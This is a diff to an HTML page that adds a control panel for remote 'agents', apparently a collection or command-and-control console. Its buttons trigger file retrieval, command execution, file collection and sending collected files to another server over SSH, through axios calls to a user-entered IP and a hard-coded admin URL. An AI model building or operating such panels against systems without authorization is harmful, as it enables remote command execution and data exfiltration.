@@ -1,5 +1,8 @@
 <html>
    <head>
+        <script>
+            const adminurl = "http://192.168.1.81:8080"
+        </script>
       <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
       <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
       <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
@@ -35,9 +38,62 @@
                 </ul>
             </div>
         </nav>
-      <div class="fp-3">
-        <h2><u>BUTTON CONTROL FOR *(DROPDOWN LIST OF IP)*</u></h2>
-      </div>
+        <div class="p-3">
+            <h2>Target Agent IP:</h2>
+            <p><input type = "text" name = "output" id="agent_ip"/></p>
+        </div>
+        <div class="p-3">
+            <h2><u>File retrieval</u></h2>
+            <button onclick="agent_action('file_retrieval')">File retrieval</button>  
+         </div>
+        <div class="p-3">
+            <h2><u>Command Execution + Save to file</u></h2>
+            <button onclick="agent_action('command')">Command execute</button>  
+         </div>
+         <div class="p-3">
+            <h2 class=""><u>Copy specific files to a folder</u></h2>
+            <button onclick="agent_action('file_collection')">Copycopycopy</button>  
+         </div>
+         <div class="p-3">
+            <h2 class=""><u>Send Collected files to another Server via SSH</u></h2>
+            <button onclick="agent_action('ssh_send')">ssshhhhhhh</button>  
+         </div>
+        <script>
+            function agent_action(api){
+                event.preventDefault()
+                const agent_ip = $('#agent_ip').val()
+                if (api == "file_retrieval"){
+                    axios.get(`http://${agent_ip}:5000/${api}`).then((response) => {
+                        file_location = response.data.file_location
+                        filenumber = response.data.filenumber
+                        if (filenumber > 1){
+                            axios.post(`${adminurl}/api/exec`, {file_location : file_location, zip : "Yes"})
+                        }
+                        else{
+                            axios.post(`${adminurl}/api/exec`, {file_location : file_location, zip : "No"})
+                        }
+                    })
+                }
+                else if(api == "file_collection"){
+                    axios({
+                        url: `http://${agent_ip}:5000/${api}`, //your url
+                        method: 'GET',
+                        responseType:'application/zip',
+                        responseType: 'blob', // important
+                    }).then((response) => {
+                        let blob = window.URL.createObjectURL(new Blob([response.data], { type: 'application/zip' }))
+                        let a = document.createElement("a"); 
+                        a.href = blob;
+                        a.setAttribute('download', 'retrieval.zip');
+                        document.body.appendChild(a);
+                        a.click();
+                    });
+                }
+                else{
+                    axios.get(`http://${agent_ip}:5000/${api}`)
+                }
+            }
+        </script>
    </body>
 </html>
 
